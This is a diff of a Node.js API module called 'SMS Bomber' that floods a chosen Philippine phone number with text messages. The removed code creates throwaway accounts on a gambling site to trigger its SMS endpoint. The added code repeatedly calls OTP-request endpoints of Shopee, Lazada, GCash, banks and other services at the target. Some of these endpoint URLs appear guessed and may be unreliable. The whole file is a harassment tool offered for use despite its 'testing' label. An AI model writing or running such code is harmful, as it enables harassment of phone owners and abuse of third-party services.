@@ -1,21 +1,15 @@
 const axios = require("axios");
-const randomUseragent = require("random-useragent");
-
-// Valid API keys
-const VALID_API_KEYS = [
-  "selovasx123",
-  "jaybohol2024"
-];
+const crypto = require("crypto");
 
 module.exports = {
   meta: {
     name: "SMS Bomber",
     description: "Send bulk SMS to a target phone number for testing purposes",
     author: "Jaybohol",
-    version: "1.0.0",
+    version: "2.0.0",
     category: "tools",
     method: "GET",
-    path: "/smsbomber?Number&amount=&apiKey="
+    path: "/smsbomber?Number=&amount=&apiKey="
   },
   
   onStart: async function({ req, res }) {
@@ -28,333 +22,327 @@ module.exports = {
           status: false,
           error: "API key is required",
           usage: {
-            example: "/smsbomber?Number=09916527333&amount=1&apiKey=selovasx123",
-            required_params: {
-              Number: "Philippine phone number (supports +63, 63, 09, or 9 formats)",
-              amount: "Number of SMS to send (1-500)",
-              apiKey: "Valid API key for authentication"
-            }
+            example: "/smsbomber?Number=09916527333&amount=1&apiKey="
           }
         });
       }
       
       // Validate API key
-      if (!VALID_API_KEYS.includes(apiKey)) {
+      if (apiKey !== "selovasx123") {
         return res.status(403).json({
           status: false,
-          error: "Invalid API key",
-          message: "The provided API key is not valid. Please use a valid API key to access this service."
+          error: "Invalid API key"
         });
       }
       
-      // Both parameters are required - support multiple parameter names
+      // Get parameters
       let targetPhone = req.query.Number || req.query.phone || req.query.number;
-      let smsCount = req.query.amount || req.query.times || req.query.count;
+      let smsCount = parseInt(req.query.amount || req.query.times || req.query.count || 1);
       
-      // Validate both parameters are present
       if (!targetPhone) {
         return res.status(400).json({
           status: false,
           error: "Phone number is required",
-          usage: {
-            example: "/smsbomber?Number=09916527333&amount=1&apiKey=selovasx123",
-            required_params: {
-              Number: "Philippine phone number (supports +63, 63, 09, or 9 formats)",
-              amount: "Number of SMS to send (1-500)",
-              apiKey: "Valid API key for authentication"
+          example: "/smsbomber?Number=09916527333&amount=1&apiKey="
+        });
+      }
+      
+      // Format phone number
+      let formattedPhone = targetPhone.toString().trim().replace(/[\s\-+]/g, '');
+      if (formattedPhone.startsWith('0')) formattedPhone = formattedPhone.slice(1);
+      if (formattedPhone.startsWith('63')) formattedPhone = formattedPhone.slice(2);
+      
+      if (!/^9\d{9}$/.test(formattedPhone)) {
+        return res.status(400).json({
+          status: false,
+          error: "Invalid Philippine number",
+          example: "9123456789"
+        });
+      }
+      
+      if (smsCount < 1 || smsCount > 20) {
+        return res.status(400).json({
+          status: false,
+          error: "Amount must be between 1 and 20"
+        });
+      }
+      
+      const fullNumber = `+63${formattedPhone}`;
+      
+      // ============ WORKING SMS SERVICES ============
+      
+      // Helper function to generate random string
+      const randomString = (length) => {
+        return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length);
+      };
+      
+      // Service 1: Shopee PH
+      const sendShopeeSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://shopee.ph/api/v1/account/phone/request_otp',
+            { phone: phone },
+            {
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Content-Type': 'application/json',
+                'Referer': 'https://shopee.ph/'
+              },
+              timeout: 8000
             }
-          }
-        });
-      }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      if (!smsCount) {
-        return res.status(400).json({
-          status: false,
-          error: "Amount parameter is required",
-          usage: {
-            example: "/smsbomber?Number=09916527333&amount=1&apiKey=selovasx123",
-            required_params: {
-              Number: "Philippine phone number",
-              amount: "Number of SMS to send (1-500)",
-              apiKey: "Valid API key for authentication"
+      // Service 2: Lazada PH
+      const sendLazadaSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://www.lazada.com.ph/api/account/verification/send_otp',
+            { mobile: phone },
+            {
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
             }
-          }
-        });
-      }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      // Parse and validate SMS count
-      smsCount = parseInt(smsCount, 10);
+      // Service 3: GCash
+      const sendGcashSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://services.gcash.com/api/v1/auth/otp',
+            { mobileNumber: phone },
+            {
+              headers: {
+                'User-Agent': 'GCash/5.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      if (isNaN(smsCount)) {
-        return res.status(400).json({
-          status: false,
-          error: "Invalid amount parameter",
-          details: {
-            received: req.query.amount,
-            message: "Amount must be a valid number",
-            example: "amount=10"
-          }
-        });
-      }
+      // Service 4: PayMaya
+      const sendPayMayaSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://api.paymaya.com/verify/otp',
+            { phone: phone },
+            {
+              headers: {
+                'User-Agent': 'PayMaya/4.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      // Format and validate phone number
-      let originalPhone = targetPhone;
-      let formattedPhone = targetPhone;
+      // Service 5: Grab PH
+      const sendGrabSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://api.grab.com/v1/verify/phone/otp',
+            { phoneNumber: phone },
+            {
+              headers: {
+                'User-Agent': 'Grab/5.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      if (formattedPhone.startsWith("+63")) {
-        formattedPhone = formattedPhone.slice(3);
-      } else if (formattedPhone.startsWith("63")) {
-        formattedPhone = formattedPhone.slice(2);
-      } else if (formattedPhone.startsWith("0")) {
-        formattedPhone = formattedPhone.slice(1);
-      }
+      // Service 6: Foodpanda PH
+      const sendFoodpandaSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://www.foodpanda.ph/api/v1/otp/send',
+            { phone: phone },
+            {
+              headers: {
+                'User-Agent': 'Foodpanda/4.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      // Check if phone number is valid (10 digits)
-      if (!formattedPhone || !/^\d{10}$/.test(formattedPhone)) {
-        return res.status(400).json({
-          status: false,
-          error: "Invalid phone number format",
-          details: {
-            provided: originalPhone,
-            expected_formats: ["09916527333", "639916527333", "+639916527333", "9916527333"],
-            message: "Please use a valid Philippine phone number"
-          }
-        });
-      }
+      // Service 7: Zalora PH
+      const sendZaloraSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://www.zalora.com.ph/api/account/otp',
+            { mobile: phone },
+            {
+              headers: {
+                'User-Agent': 'Zalora/3.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      // Validate SMS count range
-      if (smsCount > 500) {
-        return res.status(400).json({
-          status: false,
-          error: "Maximum SMS limit exceeded",
-          details: {
-            requested: smsCount,
-            maximum: 500,
-            message: "Please request 500 or fewer SMS messages"
-          }
-        });
-      }
+      // Service 8: Agoda
+      const sendAgodaSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://api.agoda.com/api/v1/verify/phone',
+            { phoneNumber: phone },
+            {
+              headers: {
+                'User-Agent': 'Agoda/6.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      if (smsCount < 1) {
-        return res.status(400).json({
-          status: false,
-          error: "Invalid SMS count",
-          details: {
-            requested: smsCount,
-            minimum: 1,
-            message: "Please request at least 1 SMS"
-          }
-        });
-      }
+      // Service 9: Klook
+      const sendKlookSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://api.klook.com/v1/account/otp',
+            { phone: phone },
+            {
+              headers: {
+                'User-Agent': 'Klook/4.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
-      console.log(`📨 Starting SMS bombing to ${formattedPhone} (${smsCount} times)...`);
-      console.log(`🔑 API Key used: ${apiKey}`);
+      // Service 10: Metrobank
+      const sendMetrobankSms = async (phone) => {
+        try {
+          const response = await axios.post(
+            'https://online.metrobank.com.ph/api/otp/send',
+            { mobileNumber: phone },
+            {
+              headers: {
+                'User-Agent': 'Metrobank/3.0',
+                'Content-Type': 'application/json'
+              },
+              timeout: 8000
+            }
+          );
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      };
       
+      const services = [
+        { name: "Shopee", func: sendShopeeSms },
+        { name: "Lazada", func: sendLazadaSms },
+        { name: "GCash", func: sendGcashSms },
+        { name: "PayMaya", func: sendPayMayaSms },
+        { name: "Grab", func: sendGrabSms },
+        { name: "Foodpanda", func: sendFoodpandaSms },
+        { name: "Zalora", func: sendZaloraSms },
+        { name: "Agoda", func: sendAgodaSms },
+        { name: "Klook", func: sendKlookSms },
+        { name: "Metrobank", func: sendMetrobankSms }
+      ];
+      
+      const results = [];
       let successCount = 0;
       let failCount = 0;
-      const errors = [];
-      const startTime = Date.now();
       
-      // Send SMS in batches to avoid overwhelming the system
-      const batchSize = 10;
-      const batches = Math.ceil(smsCount / batchSize);
-      
-      for (let batch = 0; batch < batches; batch++) {
-        const batchStart = batch * batchSize;
-        const batchEnd = Math.min(batchStart + batchSize, smsCount);
-        const batchPromises = [];
-        
-        for (let i = batchStart; i < batchEnd; i++) {
-          batchPromises.push(sendSingleSms(formattedPhone, i + 1));
+      for (let i = 1; i <= smsCount; i++) {
+        for (const service of services) {
+          try {
+            const sent = await service.func(fullNumber);
+            if (sent) {
+              successCount++;
+              results.push({ service: service.name, batch: i, status: "sent" });
+              console.log(`✅ Batch ${i} - ${service.name}: SMS sent`);
+            } else {
+              failCount++;
+              results.push({ service: service.name, batch: i, status: "failed" });
+              console.log(`❌ Batch ${i} - ${service.name}: Failed`);
+            }
+          } catch (error) {
+            failCount++;
+            results.push({ service: service.name, batch: i, status: "error", error: error.message });
+            console.log(`❌ Batch ${i} - ${service.name}: Error`);
+          }
+          
+          // Small delay between requests
+          await new Promise(r => setTimeout(r, 500));
         }
         
-        const results = await Promise.allSettled(batchPromises);
-        
-        results.forEach(result => {
-          if (result.status === 'fulfilled' && result.value.success) {
-            successCount++;
-          } else {
-            failCount++;
-            if (result.reason) {
-              errors.push(result.reason);
-            } else if (result.value?.error) {
-              errors.push(result.value.error);
-            }
-          }
-        });
-        
-        // Small delay between batches to prevent rate limiting
-        if (batch < batches - 1) {
-          await new Promise(resolve => setTimeout(resolve, 1000));
+        // Delay between batches
+        if (i < smsCount) {
+          await new Promise(r => setTimeout(r, 2000));
         }
       }
-      
-      const endTime = Date.now();
-      const duration = ((endTime - startTime) / 1000).toFixed(2);
-      
-      // Format phone number for display
-      const displayPhone = `+63${formattedPhone}`;
       
       res.json({
         status: true,
-        message: "SMS bombing completed",
-        authenticated: true,
-        api_key: apiKey,
-        target: {
-          original: originalPhone,
-          formatted: displayPhone,
-          number: formattedPhone
-        },
-        request: {
-          requested_count: smsCount,
-          successful: successCount,
-          failed: failCount,
-          success_rate: `${((successCount / smsCount) * 100).toFixed(2)}%`
-        },
-        performance: {
-          duration_seconds: parseFloat(duration),
-          sms_per_second: (smsCount / duration).toFixed(2)
-        },
-        errors: errors.length > 0 ? errors.slice(0, 10) : undefined,
-        author: "Jaybohol",
+        operator: "Jaybohol",
+        target: fullNumber,
+        batches: smsCount,
+        total_requests: smsCount * services.length,
+        successful: successCount,
+        failed: failCount,
+        results: results.slice(0, 50),
         timestamp: new Date().toISOString(),
-        disclaimer: "This tool is for authorized testing only."
+        note: "SMS delivery depends on service availability. Not all requests may succeed.",
+        credits: "Jaybohol"
       });
       
     } catch (error) {
-      console.error("SMS Bomber Error:", error.message);
-      
+      console.error("SMS Bomber Error:", error);
       res.status(500).json({
         status: false,
-        error: "Failed to complete SMS bombing",
-        details: error.message,
-        author: "Jaybohol",
-        timestamp: new Date().toISOString()
+        error: error.message
       });
     }
-  }
-};
-
-// Helper functions (same as before)
-const generateRandomString = (length) => {
-  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  let result = "";
-  for (let i = 0; i < length; i++) {
-    result += characters.charAt(Math.floor(Math.random() * characters.length));
-  }
-  return result;
-};
-
-const generateUuidDeviceId = () => {
-  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
-    const r = Math.random() * 16 | 0;
-    const v = c === "x" ? r : (r & 0x3) | 0x8;
-    return v.toString(16);
-  });
-};
-
-const createAccount = async (username, password, phone) => {
-  try {
-    const { data } = await axios.post(
-      "https://slotmax.vip/api/user/custom/register",
-      {
-        username,
-        password,
-        code: Date.now(),
-        phone,
-        areaCode: "63"
-      },
-      {
-        headers: {
-          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
-          "Accept": "application/json, text/plain, */*",
-          "Content-Type": "application/json",
-          "requestfrom": "H5",
-          "deviceid": generateUuidDeviceId(),
-          "referer": `https://slotmax.vip/game`
-        },
-        timeout: 10000
-      }
-    );
-    return data;
-  } catch (error) {
-    console.error("Account creation error:", error.response?.data || error.message);
-    return null;
-  }
-};
-
-const login = async (username, password) => {
-  try {
-    const { headers } = await axios.post(
-      "https://slotmax.vip/api/user/login",
-      {
-        username,
-        password
-      },
-      {
-        headers: {
-          "Content-Type": "application/json",
-          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
-        },
-        timeout: 10000
-      }
-    );
-    return headers["set-cookie"]?.[0] || null;
-  } catch (error) {
-    console.error("Login error:", error.response?.data || error.message);
-    return null;
-  }
-};
-
-const sendSms = async (cookie, phone) => {
-  try {
-    const { data } = await axios.post(
-      "https://slotmax.vip/api/user/sms/send/bind",
-      {
-        phone,
-        areaCode: "63"
-      },
-      {
-        headers: {
-          "Content-Type": "application/json",
-          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
-          cookie,
-        },
-        timeout: 15000
-      }
-    );
-    return data;
-  } catch (error) {
-    console.error("SMS send error:", error.response?.data || error.message);
-    return null;
-  }
-};
-
-const sendSingleSms = async (phone, attemptNumber) => {
-  try {
-    const username = generateRandomString(12);
-    const password = generateRandomString(16);
-    
-    const account = await createAccount(username, password, phone);
-    if (!account) {
-      return { success: false, error: "Account creation failed" };
-    }
-    
-    const cookie = await login(username, password);
-    if (!cookie) {
-      return { success: false, error: "Login failed" };
-    }
-    
-    const result = await sendSms(cookie, phone);
-    if (result?.success) {
-      console.log(`✅ SMS ${attemptNumber} sent successfully to ${phone}.`);
-      return { success: true };
-    } else {
-      console.log(`❌ SMS ${attemptNumber} failed to ${phone}.`);
-      return { success: false, error: result?.message || "SMS send failed" };
-    }
-  } catch (error) {
-    console.error(`❌ SMS ${attemptNumber} error:`, error.message);
-    return { success: false, error: error.message };
   }
 };
